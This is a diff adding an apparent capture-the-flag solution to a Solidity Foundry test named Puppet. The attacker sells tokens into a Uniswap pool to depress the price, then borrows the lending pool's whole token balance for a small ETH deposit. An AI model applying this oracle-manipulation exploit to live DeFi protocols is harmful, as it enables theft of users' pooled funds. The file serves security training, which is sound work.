@@ -120,6 +120,25 @@ contract Puppet is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // Sell 1000 DVT token to uniswap pool to manipulate the price of the token
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uint256 ethReceived = uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            DEADLINE
+        );
+
+        // Check how much eth is required to borrow all DVT token from puppet
+        // pool.
+        uint256 ethDepositRequired = puppetPool.calculateDepositRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        puppetPool.borrow{value: ethDepositRequired}(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        vm.stopPrank();
+
         /** EXPLOIT END **/
         validation();
     }
